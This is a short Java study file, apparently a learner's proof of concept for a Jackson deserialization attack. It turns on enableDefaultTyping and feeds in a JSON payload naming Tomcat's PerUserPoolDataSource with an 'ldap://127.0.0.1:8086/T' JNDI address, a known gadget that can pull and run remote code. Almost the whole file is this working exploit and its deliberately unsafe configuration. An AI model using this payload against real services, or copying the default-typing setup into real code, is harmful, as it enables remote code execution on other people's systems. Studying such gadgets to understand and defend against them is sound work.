package jackson;

/**
 * @BelongsProject: study_java
 * @BelongsPackage: jackson
 * @Author: Clown
 * @CreateTime: 2023-10-24  20:48
 */
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializationFeature;


public class test {
    public static void main(String[] args) throws Exception {
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        mapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, false);
        String json = "[\"org.apache.tomcat.dbcp.dbcp.datasources.PerUserPoolDataSource\", {\"dataSourceName\":\"ldap://127.0.0.1:8086/T\"}]";
        Object obj = mapper.readValue(json, Object.class);
        mapper.writeValueAsString(obj);

    }
}
